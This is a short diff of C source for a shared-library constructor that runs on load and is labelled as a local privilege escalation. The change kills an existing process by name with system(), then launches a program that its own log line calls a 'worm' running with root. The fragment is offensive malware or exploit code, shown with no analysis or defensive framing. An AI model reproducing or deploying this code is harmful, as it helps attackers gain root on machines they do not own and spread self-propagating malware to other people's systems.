@@ -19,9 +19,13 @@ void __attribute__((constructor)) setup() {
 
   char p[4096] = {0};
 
-  sprintf(p, "\"kill `pidof %s`; %s\"", buf, buf);
-  printf("[LPE] Running: sh -c %s\n", p);
-  // exec
-  char *empty[] = {"-c", p};
-  execve("/bin/sh", empty, empty);
+  printf("[LPE] Killing old process\n");
+  
+  sprintf(p, "kill `pidof %s`", buf);
+  system(p);
+
+  printf("[LPE] running worm with root\n");
+  system(buf);
+
+  exit(0);
 }
